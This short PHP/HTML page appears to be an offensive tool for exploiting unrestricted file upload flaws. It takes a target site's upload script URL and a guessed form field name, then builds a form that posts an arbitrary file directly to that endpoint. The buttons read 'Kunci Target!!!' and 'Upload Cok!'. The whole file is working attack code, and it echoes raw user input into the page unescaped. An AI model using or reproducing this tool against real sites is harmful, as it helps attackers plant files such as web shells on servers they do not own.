<html>
<form method="post">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" name="d" value="Kunci Target!!!">
</form>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Cok!'></form";
}
?>
</form>
</html>
